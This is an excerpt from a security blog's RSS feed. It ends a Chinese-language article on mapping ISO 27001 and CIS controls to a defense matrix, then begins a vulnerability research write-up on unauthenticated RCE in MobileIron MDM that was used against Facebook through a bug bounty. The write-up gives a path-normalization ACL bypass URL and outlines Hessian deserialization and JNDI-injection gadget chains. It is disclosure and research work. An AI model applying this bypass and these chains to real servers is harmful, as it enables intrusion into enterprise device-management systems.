&lt;/blockquote&gt;

&lt;p&gt;ä»¥ ISO 27001 ä½œç‚ºä¾‹å­ï¼Œå°‡å…¶æœ¬æ–‡çš„è¦æ±‚åŠé™„éŒ„ A çš„æ§åˆ¶æªæ–½ï¼Œå°æ‡‰åˆ° CDM ä¸Šï¼Œé€²è€Œç›¤é» ISO 27001 åœ¨çµ„ç¹”çš„ç¨‹åºé¢æ‰€èƒ½æ¶µè“‹çš„ç¯„åœã€‚è¦æ³¨æ„çš„æ˜¯ï¼Œä¸åŒçµ„ç¹”åœ¨ç›¤é»æ™‚ï¼Œæœƒç”¢ç”Ÿä¸åŒçš„å°æ‡‰çµæœï¼Œé€™æ­£æ˜¯é€é CDM ä¾†æª¢è¦–çš„æ„ç¾©æ‰€åœ¨ï¼›ä¾‹å¦‚åœ¨ç›¤é»ã€ŒA.7.2.2 è³‡è¨Šå®‰å…¨èªçŸ¥ã€æ•™è‚²åŠè¨“ç·´ã€æ™‚ï¼Œä¼æ¥­è¦æ€è€ƒå°æ–¼äººå“¡çš„æ•™è‚²è¨“ç·´æ˜¯å¦æ¶µè“‹åˆ° NIST CSF çš„äº”å¤§é¡åˆ¥ï¼Œé‚„æ˜¯åªåŒ…å«äººå“¡æ„è­˜çš„è¨“ç·´ï¼›å¦å¤–ä»¥ã€ŒA.6.2.2 é è·å·¥ä½œã€çš„é˜²è­·æ©Ÿåˆ¶ï¼Œé™¤äº†é‡å°ç¶²è·¯å±¤åŠæ‡‰ç”¨ç¨‹å¼ä¿è­·å¤–ï¼Œç®¡ç†ç¨‹åºæ˜¯å¦ä¹ŸåŒ…å«é è·å·¥ä½œçš„è³‡æ–™åŠè¨­å‚™è¦æ±‚ï¼Ÿ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æ¥è‘—ï¼Œå¾€ä¸‹ä¸€å±¤ (Procedure Layer)ï¼Œä¹Ÿå°‡ä¼æ¥­ç¾æœ‰çš„æ§åˆ¶æªæ–½ï¼Œå°æ‡‰åˆ° CDM ä¸­ã€‚é€™é‚Šä»¥ CIS CSC ç‚ºä¾‹ï¼Œæ·ºè—è‰²çš„éƒ¨ä»½å±¬æ–¼åŸºæœ¬å‹çš„æ§åˆ¶ç¾¤çµ„ã€ç°è‰²éƒ¨åˆ†ç‚ºåŸºç¤å‹æ§åˆ¶ç¾¤çµ„ï¼Œçµ„ç¹”å‹çš„æ§åˆ¶ç¾¤çµ„å› ç‚ºæ¯”è¼ƒåå‘ç¨‹åºé¢ï¼Œå› æ­¤æ¯”è¼ƒé›£å–®ç¨æ­¸å±¬åœ¨ç‰¹å®šçš„ CDM å€å¡Šä¸­ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;é€éçœŸå¯¦çš„å¨è„…è£œè¶³è³‡å®‰ç­–ç•¥çš„ä¸è¶³&quot;&gt;é€éçœŸå¯¦çš„å¨è„…ï¼Œè£œè¶³è³‡å®‰ç­–ç•¥çš„ä¸è¶³&lt;/h2&gt;

&lt;p&gt;åœ¨é€é CDM ç›¤é»å®Œ Procedure Layer åŠ Process Layer å¾Œï¼Œä¼æ¥­æ¥è‘—å¯ä»¥é€éè³‡å®‰äº‹æ•…ã€å¨è„…æƒ…è³‡ã€ç´…éšŠæ¼”ç·´æˆ–æ¨¡æ“¬å…¥ä¾µæ”»æ“Šå·¥å…· (BAS) ç­‰è²¼è¿‘çœŸå¯¦å¨è„…çš„æœå‹™æˆ–å·¥å…·ï¼Œä¾†æ€è€ƒè³‡å®‰ç­–ç•¥çš„ä¸è¶³ä¹‹è™•ã€‚é€™é‚Šæˆ‘å€‘ä»¥ä¸€å€‹ç´…éšŠæ¼”ç·´çš„éƒ¨åˆ†æˆæœä½œç‚ºæ¡ˆä¾‹ï¼Œä¾†è²«ç©¿æœ¬ç¯‡æ–‡ç« çš„æ‡‰ç”¨ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨é€™å€‹æ¡ˆä¾‹ä¸­ï¼Œæˆ‘å€‘ç´„ç•¥å¯ä»¥ç™¼ç¾å¹¾å€‹å•é¡Œï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ç¨‹å¼æ’°å¯«ä¸å¤ å®‰å…¨ï¼šä»¥è‡´å­˜åœ¨ä»»æ„æª”æ¡ˆä¸Šå‚³çš„æ¼æ´ã€‚&lt;/li&gt;
  &lt;li&gt;ä¸åŒç³»çµ±é–“ä½¿ç”¨å…±ç”¨å¸³è™Ÿå¯†ç¢¼ï¼šå°è‡´æ’åº«æ”»æ“Šå¯ä»¥æˆåŠŸï¼Œè€Œç›£æ§æ©Ÿåˆ¶æˆ–çµ„æ…‹ç®¡ç†é¡¯ç„¶æœªç™¼æ®ä½œç”¨ã€‚&lt;/li&gt;
  &lt;li&gt;æœªä¾ç…§è³‡æ–™æ©Ÿæ•æ€§é€²è¡Œç¶²æ®µå€éš”ï¼šå°å¤–æœå‹™ç¶²æ®µå¯ä»¥é€é RDP é€£ç·šè‡³ core zoneã€‚&lt;/li&gt;
  &lt;li&gt;ç‰¹æ¬Šå¸³è™Ÿèˆ‡å­˜å–æ§åˆ¶æœªé€²è¡Œé—œè¯åˆ†æï¼šè‡´å¯ä»¥ä½¿ç”¨ backup å¸³è™Ÿç™»å…¥ AD ç¶²åŸŸæ§åˆ¶å™¨ã€‚&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ä¸Šè¿°çš„ 4 å€‹é …ç›®ï¼Œæ˜¯ç›´è¦ºåœ¨ç›¤é»æ™‚å¯èƒ½æƒ³åˆ°çš„ç–æ¼é …ç›®ã€‚ä½†è¦æ€éº¼ç¢ºèªé‚„æœ‰å…¶ä»–æ ¹å›  (root cause) æ˜¯ä¼æ¥­æ²’æ€è€ƒåˆ°çš„å‘¢ï¼Ÿé€™æ™‚å€™å°±å¯ä»¥åˆ©ç”¨å·²çŸ¥çš„æ¨™æº–åŠæ¡†æ¶ï¼Œæ­é…å…ˆå‰ç›¤é»å¥½çš„æ§åˆ¶é …ç›®ï¼Œä¾†æ›´ç‚ºå‘¨å»¶çš„æ€è€ƒç›®å‰é‚„å¯ä»¥å¼·åŒ–çš„æ§åˆ¶æªæ–½ï¼›å¦‚æœä¼æ¥­çš„è³‡æºæœ‰é™ï¼Œç”šè‡³å¯ä»¥åƒè€ƒ CIS CSC å°æ–¼å„ªå…ˆæ¬Šçš„å»ºè­°é †åºï¼Œå…ˆç¢ºèªçµ„ç¹”å¯¦ä½œç¾¤çµ„ (Implementation Group) ï¼Œå†ä¾åŸºæœ¬å‹ã€åŸºç¤å‹åŠçµ„ç¹”å‹ï¼Œè¨‚å®šçŸ­ã€ä¸­ã€é•·æœŸè¨ˆç•«åŠæŠ•æ”¾è³‡æºï¼Œæœ‰ç›®æ¨™çš„æ”¹å–„é˜²ç¦¦èƒ½è€ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æœ€å¾Œï¼Œå¯ä»¥å°‡ä¸Šåœ–æ‰¾å‡º Procedure Layer çš„æ§åˆ¶é …ç›®ï¼Œå°æ‡‰åˆ° Process Layer çš„ç›¤é»çµæœï¼Œæª¢è¦–æµç¨‹ä¸Šå°æ‡‰çš„ä½œæ³•ã€‚ä»¥ ã€Œ14.1ã€ä¾æ“šæ•æ„Ÿæ€§ç¶²è·¯é€²è¡Œå€éš”ã€ç‚ºä¾‹ï¼Œå»è©•ä¼° ISO 27001 ä¸­ã€ŒA.6.2.2 é è·å·¥ä½œã€çš„è¦æ±‚ä¸Šï¼Œåœ¨è¨­å‚™ã€æ‡‰ç”¨ç¨‹å¼ã€ç¶²è·¯ã€è³‡æ–™åŠä½¿ç”¨è€…ï¼Œæ˜¯å¦éƒ½æœ‰åšå¥½ç¶²è·¯å€éš”ï¼›æˆ–æ˜¯ã€Œ6.3 é–‹å•Ÿæ›´è©³ç›¡çš„æ—¥èªŒã€ï¼Œè©•ä¼°åœ¨ ISO 27001 ä¸­ã€ŒA.16.1.5ã€å°æ–¼è³‡è¨Šå®‰å…¨äº‹æ•…çš„å›æ‡‰ä¸Šï¼Œåœ¨åµæ¸¬ã€å›æ‡‰è·Ÿå¾©åŸä¸Šï¼Œæ˜¯å¦éƒ½æœ‰å°æ‡‰çš„ç¨‹åºå¯ä»¥æ”¯æŒï¼Œç›£æ§åˆ°ç™¼å‡ºçš„å‘Šè­¦ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é€éæœ¬ç¯‡çš„æ–¹æ³•è«–å¯ä»¥å¾æŠ€è¡“ã€ç¨‹åºã€æµç¨‹åˆ°é¢¨éšªï¼Œè®“ä¸åŒéšå±¤çš„è³‡å®‰å¾æ¥­äººå“¡æœ‰ä¸€è‡´æ€§çš„æºé€šæ–¹å¼ã€‚æˆ‘å€‘å¸Œæœ›è³‡å®‰ç­–ç•¥å°æ–¼ä¼æ¥­æ˜¯ä¸€å€‹çœŸæ­£å¯è¢«å¯¦ä½œã€å»ºç«‹å‡ºçŸ­ã€ä¸­ã€é•·æœŸç›®æ¨™çš„å‹™å¯¦ä½œç‚ºï¼Œè€Œéåªæ˜¯ä¸€å€‹çµ„ç¹”æ²»ç†ä¸­çš„ä¸€å€‹é«˜æ·±åè©ã€‚&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2020/10/13/mitigate-real-threats-by-framework-and-standards/</link>
                <guid>https://devco.re/blog/2020/10/13/mitigate-real-threats-by-framework-and-standards</guid>
                <pubDate>Tue, 13 Oct 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>How I Hacked Facebook Again! Unauthenticated RCE on MobileIron MDM</title>
                <description>&lt;style type=&quot;text/css&quot;&gt;
    table {
        display: block;
        width: 100%;
        overflow: auto;
        word-break: normal;
        word-break: keep-all;
        font-size: smaller;
    }

    table th {
        font-weight: bold
    }

    table th,
    table td {
        padding: 5px 11px;
        border: 1px solid #ddd;
    }

    table tr {
        background-color: #fff;
        border-top: 1px solid #ccc;
    }

    table tr:nth-child(2n) {
        background-color: #f8f8f8;
    }
&lt;/style&gt;

&lt;p&gt;&lt;a href=&quot;/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM-en/&quot;&gt;English Version&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Hi, itâ€™s a long time since my last article. This new post is about my research this March, which talks about how I found vulnerabilities on a leading Mobile Device Management product and bypassed several limitations to achieve unauthenticated RCE. All the vulnerabilities have been reported to the vendor and got fixed in June. After that, we kept monitoring large corporations to track the overall fixing progress and then found that Facebook didnâ€™t keep up with the patch for more than 2 weeks, so we dropped a shell on Facebook and reported to their Bug Bounty program!&lt;/p&gt;

&lt;p&gt;This research is also presented at &lt;a href=&quot;http://hitcon.org/2020&quot;&gt;HITCON 2020&lt;/a&gt;. You can check the slides &lt;a href=&quot;https://hitcon.org/2020/slides/How%20I%20Hacked%20Facebook%20Again!.pdf&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;As a Red Teamer, we are always looking for new paths to infiltrate the corporate network from outside. Just like &lt;a href=&quot;https://www.blackhat.com/us-19/briefings/schedule/#infiltrating-corporate-intranet-like-nsa---pre-auth-rce-on-leading-ssl-vpns-15545&quot;&gt;our research in Black Hat USA last year&lt;/a&gt;, we demonstrated how leading SSL VPNs could be hacked and become your Virtual â€œPublicâ€ Network! SSL VPN is trusted to be secure and considered the only way to your private network. But, what if your trusted appliances are insecure?&lt;/p&gt;

&lt;p&gt;Based on this scenario, we would like to explore new attack surfaces on enterprise security, and we get interested in MDM, so this is the article for that!&lt;/p&gt;

&lt;h2 id=&quot;what-is-mdm&quot;&gt;What is MDM?&lt;/h2&gt;

&lt;p&gt;Mobile Device Management, also known as MDM, is an asset assessment system that makes the employeesâ€™ &lt;a href=&quot;https://en.wikipedia.org/wiki/Bring_your_own_device&quot;&gt;BYOD&lt;/a&gt; more manageable for enterprises. It was proposed in 2012 in response to the increasing number of tablets and mobile devices. MDM can guarantee that the devices are running under the corporate policy and in a trusted environment. Enterprise could manage assets, install certificates, deploy applications and even lock/wipe devices remotely to prevent data leakage as well.&lt;/p&gt;

&lt;p&gt;UEM (Unified Endpoint Management) is a newer term relevant to MDM which has a broader definition for managed devices. Following we use MDM to represent similar products!&lt;/p&gt;

&lt;h2 id=&quot;our-target&quot;&gt;Our target&lt;/h2&gt;

&lt;p&gt;MDM, as a centralized system, can manage and control all employeesâ€™ devices. It is undoubtedly an ideal asset assessment system for a growing company. Besides, MDM must be reachable publicly to synchronize devices all over the world. A centralized and public-exposing appliance, what could be more appealing to hackers?&lt;/p&gt;

&lt;p&gt;Therefore, we have seen hackers and APT groups abusing MDM these years! Such as phishing victims to make MDM a C&amp;amp;C server of their mobile devices, or even compromising the corporate exposed MDM server to push malicious Trojans to all devices. You can read the report &lt;a href=&quot;https://blogs.cisco.com/security/talos/malicious-mdm-lets-hide-this-app&quot;&gt;Malicious MDM: Letâ€™s Hide This App&lt;/a&gt; by Cisco Talos team and &lt;a href=&quot;https://research.checkpoint.com/2020/mobile-as-attack-vector-using-mdm/&quot;&gt;First seen in the wild - Malware uses Corporate MDM as attack vector&lt;/a&gt; by CheckPoint CPR team for more details!&lt;/p&gt;

&lt;p&gt;From previous cases, we know that MDM is a solid target for hackers, and we would like to do research on it. There are several MDM solutions, even famous companies such as Microsoft, IBM and Apple have their own MDM solution. Which one should we start with?&lt;/p&gt;

&lt;p&gt;We have listed known MDM solutions and scanned corresponding patterns all over the Internet. We found that the most prevalent MDMs are VMware AirWatch and MobileIron!&lt;/p&gt;

&lt;p&gt;So, why did we choose MobileIron as our target? According to their official website, more than 20,000 enterprises chose MobileIron as their MDM solution, and most of our customers are using that as well. We also know Facebook has exposed the MobileIron server &lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;since 2016&lt;/a&gt;. We have analyzed Fortune Global 500 as well, and found more than 15% using and exposing their MobileIron server to the public! Due to above reasons, it became our main target!&lt;/p&gt;

&lt;h2 id=&quot;where-to-start&quot;&gt;Where to Start&lt;/h2&gt;

&lt;p&gt;From &lt;a href=&quot;https://www.cvedetails.com/vulnerability-list/vendor_id-13968/Mobileiron.html&quot;&gt;past vulnerabilities&lt;/a&gt;, we learned there arenâ€™t too many researchers diving into MobileIron. Perhaps the attack vector is still unknown. But we suspect the main reason is that the firmware is too hard to obtain. When researching an appliance, turning a pure BlackBox testing into GrayBox, or WhiteBox testing is vital. We spent lots of time searching for all kinds of information on the Internet, and ended up with an RPM package. This RPM file is supposed to be the developerâ€™s testing package. The file is just sitting on a listable WebRoot and indexed by Google Search.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Anyway, we got a file to research. The released date of the file is in early 2018. It seems a little bit old but still better than nothing!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. We have informed MobileIron and the sensitive files has been removed now.&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;finding-vulnerabilities&quot;&gt;Finding Vulnerabilities&lt;/h2&gt;

&lt;p&gt;After a painful time solving the dependency hell, we set the testing package up finally. The component is based on Java and exposed three ports:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;443 - the user enrollment interface&lt;/li&gt;
  &lt;li&gt;8443 - the appliance management interface&lt;/li&gt;
  &lt;li&gt;9997 - the MobileIron device synchronization protocol (MI Protocol)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;All opened ports are TLS-encrypted. Apache is in the front of the web part and proxies all connections to backend, a Tomcat with Spring MVC inside.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/2_en.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Due to the Spring MVC, itâ€™s hard to find traditional vulnerabilities like SQL Injection or XSS from a single view. Therefore, examining the logic and architecture is our goal this time!&lt;/p&gt;

&lt;p&gt;Talking about the vulnerability, the root cause is straightforward. Tomcat exposed a Web Service that deserializes user input with Hessian format. However, this doesnâ€™t mean we can do everything! The main effort of this article is to solve that, so please see the exploitation below.&lt;/p&gt;

&lt;p&gt;Although we know the Web Service deserializes the user input, we can not trigger it. The endpoint is located on both:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;User enrollment interface - &lt;code class=&quot;highlighter-rouge&quot;&gt;https://mobileiron/mifs/services/&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Management interface - &lt;code class=&quot;highlighter-rouge&quot;&gt;https://mobileiron:8443/mics/services/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We can only touch the deserialization through the management interface because the user interface blocks the Web Service access. Itâ€™s a critical hit for us because most enterprises wonâ€™t expose their management interface to the Internet, and a management-only vulnerability is not useful to us so that we have to try harder. :(&lt;/p&gt;

&lt;p&gt;Scrutinizing the architecture, we found Apache blocks our access through Rewrite Rules. It looks good, right?&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; ^/mifs/services/(.*)$ https://%{SERVER_NAME}:8443/mifs/services/$1 [R=307,L]
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; ^/mifs/services [F]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;MobileIron relied on Apache Rewrite Rules to block all the access to Web Service. Itâ€™s in the front of a reverse-proxy architecture, and the backend is a Java-based web server.&lt;/p&gt;

&lt;p&gt;Have you recalled something?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Yes, the &lt;a href=&quot;https://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html&quot;&gt;Breaking Parser Logic&lt;/a&gt;! Itâ€™s the reverse proxy attack surface I &lt;a href=&quot;https://github.com/orangetw/My-CTF-Web-Challenges#blackbox&quot;&gt;proposed in 2015&lt;/a&gt;, and presented at &lt;a href=&quot;https://www.blackhat.com/us-18/briefings.html#breaking-parser-logic-take-your-path-normalization-off-and-pop-0days-out&quot;&gt;Black Hat USA 2018&lt;/a&gt;. This technique leverage the inconsistency between the Apache and Tomcat to bypass the ACL control and reaccess the Web Service. BTW, this excellent technique is also applied to the recently &lt;a href=&quot;https://support.f5.com/csp/article/K52145254&quot;&gt;F5 BIG-IP TMUI RCE vulnerability&lt;/a&gt;!&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://mobileiron/mifs/.;/services/someService
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;exploiting-vulnerabilities&quot;&gt;Exploiting Vulnerabilities&lt;/h2&gt;

&lt;p&gt;OK, now we have access to the deserialization wherever itâ€™s on enrollment interface or management interface. Letâ€™s go back to exploitations!&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/mbechler&quot;&gt;Moritz Bechler&lt;/a&gt; has an awesome research which summarized the Hessian deserialization vulnerability on his whitepaper, &lt;a href=&quot;https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf&quot;&gt;Java Unmarshaller Security&lt;/a&gt;. From the &lt;a href=&quot;https://github.com/mbechler/marshalsec&quot;&gt;marshalsec&lt;/a&gt; source code, we learn the Hessian deserialization triggers the &lt;code class=&quot;highlighter-rouge&quot;&gt;equals()&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;hashcode()&lt;/code&gt; while reconstructing a &lt;code class=&quot;highlighter-rouge&quot;&gt;HashMap&lt;/code&gt;. It could also trigger the &lt;code class=&quot;highlighter-rouge&quot;&gt;toString()&lt;/code&gt; through the &lt;code class=&quot;highlighter-rouge&quot;&gt;XString&lt;/code&gt;, and the known exploit gadgets so far are:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Apache XBean&lt;/li&gt;
  &lt;li&gt;Caucho Resin&lt;/li&gt;
  &lt;li&gt;Spring AOP&lt;/li&gt;
  &lt;li&gt;ROME EqualsBean/ToStringBean&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In our environment, we could only trigger the Spring AOP gadget chain and get a JNDI Injection.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Â &lt;/th&gt;
      &lt;th&gt;Name&lt;/th&gt;
      &lt;th&gt;Effect&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;Apache XBean&lt;/td&gt;
      &lt;td&gt;JNDI Injection&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;Caucho Resin&lt;/td&gt;
      &lt;td&gt;JNDI Injection&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;âˆš&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;Spring AOP&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;JNDI Injection&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;ROME EqualsBean&lt;/td&gt;
      &lt;td&gt;RCE&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Once we have a JNDI Injection, the rest parts of exploitations are easy! We can just leverage &lt;a href=&quot;https://twitter.com/pwntester&quot;&gt;Alvaro MuÃ±oz&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/olekmirosh&quot;&gt;Oleksandr Mirosh&lt;/a&gt;â€™s work, &lt;a href=&quot;https://www.blackhat.com/us-16/briefings.html#a-journey-from-jndi-ldap-manipulation-to-remote-code-execution-dream-land&quot;&gt;A Journey From JNDI/LDAP to Remote Code Execution Dream Land&lt;/a&gt;, from Black Hat USA 2016 to get the code executionâ€¦ Is that true?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/3_en.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Since &lt;a href=&quot;https://twitter.com/pwntester&quot;&gt;Alvaro MuÃ±oz&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/olekmirosh&quot;&gt;Oleksandr Mirosh&lt;/a&gt; introduced this on Black Hat, we could say that this technique helps countless security researchers and brings Java deserialization vulnerability into a new era. However, Java finally mitigated the last JNDI/LDAP puzzle in &lt;a href=&quot;https://www.oracle.com/java/technologies/javase/8u181-relnotes.html&quot;&gt;October 2018&lt;/a&gt;. After that, all java version higher than 8u181, 7u191, and 6u201 can no longer get code execution through JNDI remote URL-Class loading. Therefore, if we exploit the Hessian deserialization on the latest MobileIron, we must face this problem!&lt;/p&gt;

&lt;p&gt;Java changed the default value of &lt;code class=&quot;highlighter-rouge&quot;&gt;com.sun.jndi.ldap.object.trustURLCodebase&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; to prevent attackers from downloading remote URL-Class to get code executions. But only this has been prohibited. We can still manipulate the JNDI and redirect the Naming Reference to a local Java Class!&lt;/p&gt;

&lt;p&gt;The concept is a little bit similar to &lt;a href=&quot;https://en.wikipedia.org/wiki/Return-oriented_programming&quot;&gt;Return-Oriented Programming&lt;/a&gt;, utilizing a local existing Java Class to do further exploitations. You can refer to the article &lt;a href=&quot;https://www.veracode.com/blog/research/exploiting-jndi-injections-java&quot;&gt;Exploiting JNDI Injections in Java&lt;/a&gt; by &lt;a href=&quot;https://twitter.com/artsploit&quot;&gt;Michael Stepankin&lt;/a&gt; in early 2019 for details. It describes the attack on POST-JNDI exploitations and how to abuse the Tomcatâ€™s &lt;code class=&quot;highlighter-rouge&quot;&gt;BeanFactory&lt;/code&gt; to populate the &lt;code class=&quot;highlighter-rouge&quot;&gt;ELProcessor&lt;/code&gt; gadget to get code execution. Based on this concept, researcher &lt;a href=&quot;https://github.com/welk1n&quot;&gt;Welkin&lt;/a&gt; also provides another &lt;code class=&quot;highlighter-rouge&quot;&gt;ParseClass&lt;/code&gt; gadget on Groovy. As described in &lt;a href=&quot;https://www.cnblogs.com/Welk1n/p/11066397.html&quot;&gt;his (Chinese) article&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;é™¤äº† javax.el.ELProcessorï¼Œå½“ç„¶ä¹Ÿè¿˜æœ‰å¾ˆå¤šå…¶ä»–çš„ç±»ç¬¦åˆæ¡ä»¶å¯ä»¥ä½œä¸º beanClass æ³¨å…¥åˆ° BeanFactory ä¸­å®ç°åˆ©ç”¨ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœç›®æ ‡æœºå™¨ classpath ä¸­æœ‰ groovy çš„åº“ï¼Œåˆ™å¯ä»¥ç»“åˆä¹‹å‰ Orange å¸ˆå‚…å‘è¿‡çš„ &lt;a href=&quot;https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html&quot;&gt;Jenkins çš„æ¼æ´å®ç°åˆ©ç”¨&lt;/a&gt;&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;It seems the Meta Programming exploitation in my previous Jenkins research could be used here as well. It makes the Meta Programming great again :D&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;The approach is fantastic and looks feasible for us. But both gadgets &lt;code class=&quot;highlighter-rouge&quot;&gt;ELProcessor&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;ParseClass&lt;/code&gt; are unavailable due to our outdated target libraries. Tomcat introduced the &lt;code class=&quot;highlighter-rouge&quot;&gt;ELProcessor&lt;/code&gt; since 8.5, but our target is 7. As for the Groovy gadget, the target Groovy version is too old (1.5.6 from 2008) to support the Meta Programming, so we still have to find a new gadget by ourselves. We found a new gadget on &lt;code class=&quot;highlighter-rouge&quot;&gt;GroovyShell&lt;/code&gt; in the end. If you are interested, you can check the &lt;a href=&quot;https://github.com/welk1n/JNDI-Injection-Bypass/pull/1&quot;&gt;Pull Request&lt;/a&gt; I sent to the &lt;a href=&quot;https://github.com/welk1n/JNDI-Injection-Bypass&quot;&gt;JNDI-Injection-Bypass&lt;/a&gt; project!&lt;/p&gt;

&lt;h2 id=&quot;attacking-facebook&quot;&gt;Attacking Facebook&lt;/h2&gt;

&lt;p&gt;Now we have a perfect RCE by chaining JNDI Injection, Tomcat &lt;code class=&quot;highlighter-rouge&quot;&gt;BeanFactory&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;GroovyShell&lt;/code&gt;. Itâ€™s time to hack Facebook!&lt;/p&gt;

&lt;p&gt;Aforementioned, we knew the Facebook uses MobileIron since 2016. Although the serverâ€™s index responses 403 Forbidden now, the Web Service is still accessible!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Everything is ready and wait for our exploit! However, several days before our scheduled attack, we realized that there is a critical problem in our exploit. From &lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;our last time popping shell on Facebook&lt;/a&gt;, we noticed it blocks outbound connections due to security concerns. The outbound connection is vital for JNDI Injection because the idea is to make victims connecting to a malicious server to do further exploitations. But now, we canâ€™t even make an outbound connection, not to mention others.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/5_en.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;So far, all attack surfaces on JNDI Injection have been closed, we have no choice but to return to Hessian deserialization. But due to the lack of available gadgets, we must discover a new one by ourselves!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Before discovering a new gadget, we have to understand the existing gadgetsâ€™ root cause properly. After re-reading Moritz Bechlerâ€™s &lt;a href=&quot;https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf&quot;&gt;paper&lt;/a&gt;, a certain word interested me:&lt;/p&gt;

&lt;blockquote&gt;
